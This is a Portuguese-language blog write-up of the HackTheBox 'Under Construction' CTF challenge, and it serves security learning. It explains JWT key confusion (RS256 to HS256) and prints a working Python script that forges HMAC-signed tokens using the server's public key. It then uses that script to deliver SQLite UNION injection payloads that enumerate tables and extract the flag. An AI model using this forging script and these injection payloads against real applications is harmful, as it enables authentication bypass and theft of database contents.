---
title: "Em Construção - HackTheBox"
date: 2024-01-03
published: true
lang: pt-BR
translation_key: "under-construction-htb"
original_url: /under-construction-htb
permalink: /pt-br/under-construction-htb
---
# [](#intro)Introdução

Este desafio é um dos melhores CTFs que já joguei. É uma prova viva de como as coisas podem revelar uma complexidade extraordinária. HackTheBox sempre me surpreende com seu conteúdo aposentado.

Levei quase três dias para completá-lo, que dividi em três atividades principais:

* ** Primeiro dia:** jogando com o problema e lendo o código fonte.
* ** Segundo dia:** pesquisando vulnerabilidades JWT na internet, relacionadas ao desafio.
* **Terceiro dia:**Ajustando minhas cargas até que eu resolva o desafio.

Vamos ver do que se trata este CTF.


# [](#level-description)Challenge description

A descrição do desafio é:

> Descrição
>
> Uma empresa especializada em desenvolvimento web está criando um novo site que está atualmente em construção. Consegues obter a bandeira?

Nada muito revelador. Não sabemos mais nada sobre o nosso alvo. Vamos ligar a máquina e acedê-la.

Uma vez iniciado, receberemos um IP e uma porta, como: `<ip>:<port>`. Meu primeiro passo foi estabelecer uma conexão com ele usando `telnet`. Ao lidar com um desafio que especifica uma porta com o seu endereço, costumo começar com telnet para ver o que estou lidando.

```bash
kaizen@celestial /tmp/htb $ telnet 159.65.20.166 32211
Trying 159.65.20.166...
Connected to 159.65.20.166.
Escape character is '^]'.
abc 
HTTP/1.1 400 Bad Request
Connection: close

Connection closed by foreign host.
```
Essa resposta indica que o serviço é baseado na web, pois utiliza conexões HTTP. Vamos acessá-lo com o nosso navegador:

<img src="../figs/underc1.png" alt="under construciton /auth page">

Parece uma forma simples de registo/login. O que fazer agora. Vamos abrir o BurpSuite para ver o que está acontecendo quando tentamos registrar um novo usuário.

<img src="../figs/underc2.png" alt="register request/response">

<img src="../figs/underc3.png" alt="login request/response">

Como podemos ver, registramos com sucesso "mula" e entramos. Também temos um cookie de sessão, para o que parece ser um token JWT (JSON Web Token).

O desafio também nos permite baixar alguns arquivos. Depois de baixá-los, podemos ver que eles são o código fonte da página.

```bash
kaizen@celestial /tmp/htb/underc $ unzip Under\ Construction.zip 
Archive:  Under Construction.zip
  inflating: index.js                
  inflating: package.json            
   creating: middleware/
  inflating: middleware/AuthMiddleware.js  
   creating: helpers/
  inflating: helpers/DBHelper.js     
  inflating: helpers/JWTHelper.js    
   creating: routes/
  inflating: routes/index.js         
   creating: views/
  inflating: views/auth.html         
  inflating: views/index.html
```
Após uma rápida olhada em "index.js", encontramos esta linha de código:

<img src="../figs/underc5.png" alt="index.js">

Indicando que temos um middleware de autenticação que valida o servidor de requisição. Vamos ver isso agora.

<img src="../figs/underc6.png" alt="middleware">

O que nos leva ao arquivo JWTHelper.js, contendo uma lógica de implementação para autenticação JWT:

<img src="../figs/underc7.png" alt="jwt-helper">

Agora que temos uma visão básica do que estamos lidando, vamos seguir para nossa mentalidade de abordagem.


# [](#approach)Aproxime-se da mentalidade

Como sempre, vamos manter a nossa mentalidade:

1. Compreender conceitos básicos
2. Compreender o problema
3. Criando um ataque
4. Resolvendo

Já fizemos algum reconhecimento básico com os arquivos de desafio e uma suíte. Vamos começar!

## [](#mindset-step1)Passo 1 - Compreendendo conceitos básicos

Quais são as coisas que precisamos saber? Antes de mais, precisamos de entender o que são os JWTs.

JSON Web Tokens
JWTs são tokens que definem uma forma autossegura de transmitir informações - como um objeto JSON - entre usuários e o servidor. A forma de um objeto JSON consiste em três partes separadas por pontos:

- Cabeçalho

O cabeçalho tem duas partes, o tipo ou nome do token, que geralmente é JWT; e o algoritmo de assinatura, como RSA ou HMAC SHA256.

```json
{
    "typ": "JWT",
    "alg": "RS256",
}
```
- Carga útil

A carga útil consiste nas informações a transferir. Este é geralmente o nome de usuário, uma mensagem, função do usuário, etc.

```json
{
    "username": "user1",
    "isAdmin": false,
}
```
- Assinatura

E finalmente, a assinatura, que é a parte dos JWTs que garante a integridade e autenticidade do símbolo. O formato JWTs tomar é:

```
<header-encoded>.<payload-encoded>.<signature>
```
Para mais informações, você pode conferir [here](https://jwt.io/introduction).


## [](#mindset-step2)Passo 2 - Compreender o problema

Agora que sabemos um pouco mais sobre JWTs, vamos voltar para o nosso aplicativo e verificar o JWT emitido quando entramos como "mula". Vamos enviar o JWT gerado pelo servidor e usar [https://jwt.io](https://jwt.io) para decodificar:

<img src="../figs/underc8.png" alt="jwt.io decoder">

Na carga útil estamos recebendo nosso nome de usuário e uma chave pública RSA, pelo que parece. Também notei que uma vez que entramos, nosso nome de usuário é exibido na página web:

<img src="../figs/underc9.png" alt="authenticated challenge front page">

Está bem. Alguns pontos a fazer aqui:

1. Cada aplicativo que tem o gerenciamento do usuário deve ter um banco de dados e uma maneira de se comunicar com este banco de dados.
2. O JWT enviado para nós como um cookie inclui uma chave pública, e o algoritmo usado para a assinatura é RS256.

Vamos abordar cada ponto individualmente:

Base de dados?
Se investigarmos o arquivo index.js a partir do desafio, descobriremos que ele está importando um DBHelper, que também está localizado no diretório helpers que encontramos nosso arquivo JWTHelper.js. Então encontraremos o DBHelper.js, que é onde o servidor se comunica com seu banco de dados:

<img src="../figs/underc10.png" alt="DBHelper.js">

Em uma busca rápida, encontrei [esta página](https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_nodejs.html) sobre o método `get` usado para consultar o banco de dados. Podemos ver em seu exemplo uma semelhança com a construção do método `getUser` no DBHelper.js, indicando uma injeção SQL. Isso ocorre porque `username` está sendo passado diretamente para a consulta SQL, e não como um parâmetro. De volta ao index.js, descobrimos que `getUser` está sendo chamado quando alguém acessar o / caminho, que então busca o nome de usuário através do token JWT.

Chave Pública?

Isto pareceu-me estranho, por isso tive de fazer uma boa pesquisa. Minha primeira parada foi em [HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555), que mostrou um provável vetor de ataque. Com mais investigações, encontrei este [artigo OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)X, que explica este ataque. O ataque é chamado de "Confusão de Chaves Públicas". Algumas condições devem ser satisfeitas para que funcione:

1. O servidor deve esperar que um JWT seja assinado com uma chave pública (RSxxx ou ESxxx).
2. O servidor não deve verificar qual algoritmo o JWT está realmente usando, ou aceitar tanto RSxxx quanto HSxxx.
3. A chave pública usada para verificar o JWT deve estar disponível.

O ataque ocorre porque o servidor usa erroneamente `jwt.verify` quando o algoritmo é trocado de um algoritmo baseado em RSA (RSxxx) para um algoritmo baseado em HMAC (HSxxx). HMAC SHA256 é um método de criptografia simétrico, enquanto RSA não é. Nesta vulnerabilidade, se os algoritmos são trocados, `jwt.verify` fará uso da chave pública como chave secreta HMAC para decodificar o JWT e verificar, fazendo assim a aplicação para aceitar tokens maliciosamente crafted.

Vamos ver se é o nosso caso. A primeira condição é satisfeita: o algoritmo de cabeçalho JWT revela ser RS256. A segunda condição também é cumprida: se olharmos para o arquivo JWTHelper.js, vemos que na parte de decodificação a função aceita tanto RS256 quanto HS256.

<img src="../figs/underc11.png" alt="rs hs">

Vamos verificar se a chave pública fornecida pela aplicação através do JWT é uma assinatura válida. Para fazer isso, vamos usar [https://jwt.io](https://jwt.io) novamente:

<img src="../figs/underc12.png" alt="jwt.io signing jwt">

Depois de colar a chave pública - fornecida pelo JWT - na caixa acima, podemos ver que esta é a chave pública correta usada para assinar o token. Por conseguinte, a terceira condição também está preenchida.


## [](#mindset-step3)Passo 3 - Criando o ataque

Está bem! Agora vamos pensar numa forma de atacar a aplicação. Temos duas vulnerabilidades aqui: uma injeção SQL na função getUser, que usa o parâmetro de nome de usuário fornecido pelo token JWT sem qualquer higienização; e a aplicação é vulnerável à Confusão de Chaves Públicas.

Ao combinar essas vulnerabilidades, a estratégia de ataque torna-se clara: podemos criar um JWT com uma carga útil de injeção SQL no campo de nome de usuário. Ao explorar a confusão chave pública, podemos fazer o pedido aceitar o nosso JWT.

Primeiro, vamos salvar a chave pública em nossa máquina local, nomeando o arquivo `pubkey.pem`. Lembre-se, para que isso funcione corretamente, é crucial salvar a chave exatamente como mostrado abaixo:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----
```
Não há linhas novas. E certifique-se de incluir ambas as declarações de início.

Vamos construir um script Python que criará um JWT malicioso e assinado com nosso `pubkey.pem`:

```python
#!/usr/bin/python
import sys
import base64
import json
import hmac
import hashlib

if __name__ == '__main__':
    argv = sys.argv[1:]
    argc = len(argv)
    if argc != 1:
        print("Usage: python exploit.py <payload>")
        exit(0)
    
    sqli = argv[0]
    
    # read pubkey file
    with open("./pubkey.pem", "r") as f:
        pk_contents = f.read()
    
    header = {"alg": "HS256", "typ":"JWT"}
    payload = {"username": sqli, "pk": pk_contents}

    # convert to base64
    encoded_h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    encoded_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

    # concatenate header and payload
    unsigned_jwt = f"{encoded_h}.{encoded_p}"

    # HMAC 256 signing
    signature = hmac.new(pk_contents.encode(), unsigned_jwt.encode(), hashlib.sha256).digest()
    encoded_s = base64.urlsafe_b64encode(signature).decode().rstrip("=")

    jwt = f"{unsigned_jwt}.{encoded_s}"
    print(jwt)
```
Para usar este script, nós simplesmente executamos `chmod +x exploit.py`, e, em seguida, `./exploit.py "sqli payload"`, e irá gerar um válido, malicioso, token JWT para a aplicação! Para testar se está funcionando, simplesmente passaremos nosso nome de usuário como uma carga útil:

```bash
kaizen@celestial /tmp/htb $ ./exploit.py "mula"
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJtdWxhIiwgInBrIjogIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4ifQ.qE9eS5hAKyvxgcVyh4Ne26-GNklpuDVNli4VkDeSYRQ
```
Este JWT deve entrar como mula:

<img src="../figs/underc13.png" alt="crafted jwt response">

Como podemos ver, logamos com sucesso, provando que a vulnerabilidade de confusão pública está presente! Para verificar se o servidor está vulnerável à injeção SQL, usaremos a seguinte carga útil:

```bash
kaizen@celestial /tmp/htb $ ./exploit.py "' union SELECT ;--"
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIFNFTEVDVCA7LS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.DucJUAHb7T7y4mjQltzMcgQaDodL1E7VcWAgruIiJnQ
```
Isso deve produzir um erro de sintaxe, já que não estamos selecionando nada:

<img src="../figs/underc14.png" alt="sql error">

## [](#mindset-step4)Passo 4 - Resolvendo!

Está bem! Agora temos de resolver este menino mau. Ainda não sabemos onde está a bandeira, mas com uma injeção SQL podemos enumerar as tabelas de banco de dados e esperamos encontrar a bandeira. Para identificar o número de colunas da primeira instrução selecionada, utiliza-se a seguinte carga: `' union select 1,1,...,1-- -`, onde o número de colunas na injeção é o número de colunas. Tentamos isto até que não tenhamos um erro da aplicação. Depois de tentar com (1), (1,1) e (1,1,1), encontramos que o número de colunas é 3. A carga é:

```bash
kaizen@celestial /tmp/htb $ ./exploit.py "' union select 1,1,1-- -"
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIHNlbGVjdCAxLDEsMS0tIC0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.y9yJbvfy0ARuq-hmEuYxSGJHcF5h1q3BonCf77iHi_c
```
Agora, precisamos encontrar quais colunas estão sendo recuperadas pela aplicação. Para isso, mudamos nossa carga útil para `' union select 1,2,3-- -`. Uma vez que o aplicativo retorna o nome de usuário de volta para nós extraído do token, esta instrução selecionar união irá imprimir o número da coluna do nome de usuário. A responsabilidade por este pagamento é:

<img src="../figs/underc15.png" alt="second payload">

Como podemos ver, a coluna de nome de usuário é a segunda. Isto é importante saber porque esta coluna é o que a aplicação exibe em texto claro para nós. Se quisermos que imprima a bandeira, teremos de injectar a carga da bandeira nesta posição.

Agora, para recuperar todas as tabelas, precisamos selecionar os nomes das tabelas na 2a posição da coluna. Com a ajuda de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name), podemos usar `' union select 1, group_concat(tbl_name), 3 from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%'-- -`. Isto irá obter todas as tabelas na base de dados:

<img src="../figs/underc17.png" alt="third payload fetching table name">

Então o nome da tabela é `flag_storage`. Agora, precisamos extrair o nome da coluna. Esta carga deve funcionar: `' union select 1, sql, 3 from sqlite_master where type!='meta' and sql not null and name='flag_storage'-- -`:

<img src="../figs/underc18.png" alt="retrieving column name">

Agora, para recuperar a bandeira, nós simplesmente usamos este paylaod `' union select 1, top_secret_flaag, 3 from flag_storage-- -`:

<img src="../figs/underc19.png" alt="flag">

E lá está a nossa bandeira!!!

# [](#conclusions)Conclusão

Este CTF forneceu uma experiência incrível. Envolveu duas vulnerabilidades, exigindo um pensamento cuidadoso e crítico. Aprendemos muito sobre injeção SQLite e uma das muitas vulnerabilidades JWT que existem lá fora. Este desafio é um exemplo de como as coisas podem dar errado devido a uma cadeia de vulnerabilidades.

Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **

<a href="/">Voltar</a>

